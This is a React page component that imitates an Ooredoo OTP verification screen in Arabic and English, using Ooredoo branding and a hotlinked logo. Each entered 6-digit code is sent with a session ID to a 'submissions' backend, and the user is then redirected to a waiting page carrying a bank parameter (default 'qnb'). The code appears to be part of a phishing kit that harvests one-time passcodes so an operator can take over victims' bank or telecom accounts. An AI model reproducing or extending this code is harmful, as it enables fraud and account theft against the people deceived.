import { useState } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { toast } from "sonner";

export default function OtpOoredoo() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const params = new URLSearchParams(search);
  const { language, setLanguage, t } = useLanguage();
  const sessionId = localStorage.getItem("sessionId") || "";
  const showError = params.get("error") === "true";

  const isArabic = language === "ar";

  const [otp, setOtp] = useState("");
  const submitOtpMutation = trpc.submissions.submitOtp.useMutation();

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^0-9]/g, "").slice(0, 6);
    setOtp(value);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length !== 6) {
      toast.error("يجب أن يكون الرمز 6 أرقام");
      return;
    }
    try {
      await submitOtpMutation.mutateAsync({
        sessionId,
        otpCode: otp,
        otpType: "ooredoo",
      });
      const bank = params.get("bank") || "qnb";
      setLocation(`/waiting?bank=${bank}&session=${sessionId}&next=success`);
    } catch (error) {
      toast.error(isArabic ? "حدث خطأ أثناء الإرسال" : "Error during submission");
    }
  };

  return (
    <div className="page-wrapper">
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');
        .page-wrapper { font-family: 'Cairo', sans-serif; background-color: #ffffff; margin: 0; padding: 0; display: flex; justify-content: center; min-height: 100vh; }
        .container { width: 100%; max-width: 500px; box-sizing: border-box; }
        
        header { padding: 15px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #f0f0f0; background-color: #ffffff; }
        .menu-icon { font-size: 24px; cursor: pointer; color: #d71920; font-weight: bold; width: 40px; }
        .logo-container { flex-grow: 1; display: flex; align-items: center; justify-content: center; background-color: #ffffff !important; }
        .logo-container img { height: 35px; width: auto; display: block; }
        
        .lang-switch { width: 50px; text-align: center; font-size: 10px; color: #d71920; border: 1px solid #d71920; padding: 3px 5px; border-radius: 12px; cursor: pointer; font-weight: bold; }

        .content-body { padding: 20px; }
        h1 { font-size: 24px; color: #333; margin-top: 20px; margin-bottom: 10px; }
        .sub-text { color: #666; font-size: 14px; margin-bottom: 25px; }
        .input-group { margin-bottom: 15px; }
        input { width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; font-size: 16px; text-align: center; letter-spacing: 5px; }
        .login-btn { width: 100%; padding: 15px; background-color: #d71920; color: white; border: none; border-radius: 50px; font-size: 16px; font-weight: bold; cursor: pointer; max-width: 300px; margin: 0 auto; display: block; margin-top: 20px; }
      `}</style>
      <div className="container">
        <header>
          <div className="menu-icon">☰</div>
          <div className="logo-container">
            <img src="https://i.ibb.co/LzNfX8fL/ooredoo-logo.png" alt="Ooredoo Logo" />
          </div>
<div className="lang-switch" onClick={() => setLanguage(language === "ar" ? "en" : "ar")} style={{ cursor: "pointer" }}>
              {language === "ar" ? "English" : "العربية"}
            </div>
        </header>
        <div className="content-body">
            {showError && (
              <div style={{ background: "#fee2e2", border: "1px solid #ef4444", color: "#b91c1c", padding: "10px", borderRadius: "5px", marginBottom: "15px", textAlign: "center", fontSize: "14px" }}>
                {t("invalid_ooredoo_otp")}
              </div>
            )}
<h1>{language === "ar" ? "رمز التحقق" : "Verification Code"}</h1>
            <p className="sub-text">{language === "ar" ? "يرجى إدخال رمز التحقق (OTP) المرسل إلى هاتفك." : "Please enter the verification code (OTP) sent to your phone."}</p>
            <form onSubmit={handleSubmit}>
              <div className="input-group">
                <input
                  type="text"
                  placeholder="000000"
                  maxLength={6}
                  value={otp}
                  onChange={handleOtpChange}
                  required
                />
              </div>
              <button type="submit" className="login-btn">
                {language === "ar" ? "تأكيد" : "Confirm"}
              </button>
            </form>
        </div>
      </div>
    </div>
  );
}
